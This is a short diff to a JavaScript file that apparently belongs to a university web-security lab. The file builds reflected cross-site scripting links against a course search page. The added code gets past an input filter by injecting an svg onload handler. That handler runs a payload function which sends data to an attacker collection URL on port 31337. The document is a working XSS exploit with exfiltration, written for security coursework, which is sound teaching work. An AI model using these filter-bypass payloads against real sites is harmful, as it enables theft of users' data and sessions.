@@ -90,9 +90,12 @@ function makeLink(xssdefense, target, attacker) {
 	if (xssdefense == 2) { /* load inside a body tag */
 		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<body onload='" + payload.toString() + ";payload(\"" + attacker + "\");'>");
 	}
+	if (xssdefense == 3) { /* svg tags are not filtered */
+		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<svg onload='" + payload.toString() + ";payload(\"" + attacker + "\");'>");
+	}
 }
 
-var xssdefense = 2;
+var xssdefense = 3;
 var target = "http://trurl.cs.illinois.edu/";
 var attacker = "http://127.0.0.1:31337/stolen";
 
